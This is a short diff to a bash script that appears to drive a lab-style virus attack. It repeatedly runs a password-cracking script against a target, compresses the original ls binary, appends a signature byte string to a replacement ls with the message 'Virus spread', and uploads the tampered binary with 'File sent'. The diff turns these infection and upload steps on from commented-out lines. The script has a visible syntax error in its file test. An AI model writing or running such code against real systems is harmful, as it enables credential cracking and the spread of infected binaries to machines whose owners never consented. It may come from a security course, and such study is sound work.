@@ -1,9 +1,9 @@
 #!/bin/bash
-sig=0xaabbccdd
+sig="\xaa\xbb\xcc\xdd"
 
 chmod +x crack_passwd.py download_ls.py upload_ls.py
 ./crack_passwd.py $1
-#Make sure the password is cracked
+# Make sure the password is cracked
 while [ ! -f ./password]; do
     ./crack_passwd.py $1
 done
@@ -14,9 +14,10 @@ echo "Password cracked: $password"
 zip ls.zip orgi_ls
 echo "File compressed"
 
-####execute c to generate new ls
-#echo $(([#16]0xaabbccdd)) >> ./ls
-#echo "Virus spread"
+####execute C to generate new ls
+####padding
+printf $sig >> ./ls # Signature
+echo "Virus spread"
 
-#./upload_ls.py $1
-#echo "File sent"
+./upload_ls.py $1
+echo "File sent"
